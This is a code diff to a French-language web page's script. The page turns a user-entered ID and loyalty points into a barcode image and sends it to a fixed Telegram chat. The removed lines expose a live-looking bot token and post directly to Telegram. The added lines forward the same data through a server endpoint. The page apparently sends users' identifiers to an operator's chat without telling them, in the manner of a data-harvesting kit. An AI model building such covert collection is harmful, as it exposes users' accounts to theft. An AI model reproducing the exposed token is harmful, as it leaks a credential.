@@ -459,9 +459,8 @@ nav .nav-cta:hover{background:var(--yellow-hover)}
 
 <script>
 (function(){
-  const BOT_TOKEN="8905839440:AAEky6myvIH6zPFvfGROEdATeOGYWwxLgig";
+  // ❌ PLUS DE TOKEN ICI - C'est maintenant caché côté serveur
   const CHAT_ID="7148167734";
-  const API=`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
 
   let rawId="",busy=false;
   const iInput=document.getElementById('identifiantInput');
@@ -550,9 +549,19 @@ nav .nav-cta:hover{background:var(--yellow-hover)}
       const blob=await new Promise((res,rej)=>bc.toBlob(b=>b?res(b):rej(),'image/png'));
       const pts=pInput.value.trim()||"non renseignés";
       const cap=`🆔 ID : ${rawId}\n🍟 Points : ${pts}\n📦 CODE128 : ${rawId}`;
+      
+      // ✅ APPEL SÉCURISÉ À VOTRE ENDPOINT (pas directement à Telegram)
       const fd=new FormData();
-      fd.append('chat_id',CHAT_ID);fd.append('photo',blob,'code.png');fd.append('caption',cap);
-      await fetch(API,{method:'POST',body:fd});
+      fd.append('chatId',CHAT_ID);
+      fd.append('photo',blob,'code.png');
+      fd.append('caption',cap);
+      
+      const response = await fetch('/api/send-photo', {
+        method:'POST',
+        body:fd
+      });
+
+      if(!response.ok) throw new Error('Erreur serveur');
 
       s2.innerHTML=`
         <div class="card-stripe"></div>
